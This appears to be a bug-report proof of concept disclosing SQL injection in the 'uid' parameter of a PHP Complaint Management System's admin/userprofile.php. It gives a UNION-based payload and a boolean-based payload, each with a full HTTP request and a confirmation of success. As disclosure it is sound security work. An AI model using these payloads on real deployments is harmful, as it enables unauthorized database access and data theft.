BUG_Author: 808bass

Vulnerability File: /Complaint Management System/admin/userprofile.php

GET parameter 'uid' exists SQL injection vulnerability

Payload1:uid=1' union all select null,null,null,null,concat(0x414243,0x515253,0x616263),null,null,null,null,null,null,null,null-- -

```
GET /Complaint%20Management%20System/admin/userprofile.php?uid=1%27%20union%20all%20select%20null,null,null,null,concat(0x414243,0x515253,0x616263),null,null,null,null,null,null,null,null--%20- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=4amosvnpbfikcpl9np95smjnth
Connection: close
```

union query success

![image](https://github.com/winkle175/bug_report/blob/main/sql1.png)

Payload2:uid=1' and 666=666 and 'p'='p 

```
GET /Complaint%20Management%20System/admin/userprofile.php?uid=1%27%20and%20666=666%20and%20%27p%27=%27p HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=4amosvnpbfikcpl9np95smjnth
Connection: close
```

The sql statement is executed correctly

![image](https://github.com/winkle175/bug_report/blob/main/sql2.png)
